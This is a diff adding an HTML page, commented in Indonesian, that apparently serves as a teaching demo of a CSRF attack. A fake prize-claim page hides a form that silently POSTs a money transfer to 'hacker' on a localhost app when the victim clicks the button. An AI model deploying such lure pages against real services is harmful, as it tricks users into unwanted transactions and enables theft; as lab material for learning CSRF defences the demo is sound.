@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Klaim Hadiah Gratis! 🎁</title>
+  <style>
+    body { font-family: sans-serif; max-width: 500px; margin: 50px auto; text-align: center; }
+    button { padding: 15px 30px; background: #ff4444; color: white; border: none; 
+             font-size: 18px; cursor: pointer; border-radius: 8px; }
+  </style>
+</head>
+<body>
+  <h1>🎉 Selamat! Kamu Menang Hadiah!</h1>
+  <p>Klik tombol di bawah untuk klaim hadiah senilai <b>Rp1.000.000</b></p>
+  
+  <!-- 
+    ⚠️ SERANGAN CSRF:
+    Form ini diam-diam mengirim request transfer ke target-app (localhost:3000)
+    Korban tidak tahu bahwa mereka sedang melakukan transfer!
+  -->
+  <form id="csrf-form" method="POST" action="http://localhost:3001/transfer" style="display:none">
+    <input name="to" value="hacker">
+    <input name="amount" value="1000000">
+  </form>
+
+  <button onclick="attack()">🎁 Klaim Hadiah Sekarang!</button>
+  <p id="status"></p>
+
+  <script>
+    function attack() {
+      document.getElementById('status').innerText = '⏳ Memproses hadiahmu...';
+      // Submit form secara otomatis — korban tidak sadar ini adalah transfer!
+      document.getElementById('csrf-form').submit();
+    }
+  </script>
+</body>
+</html>
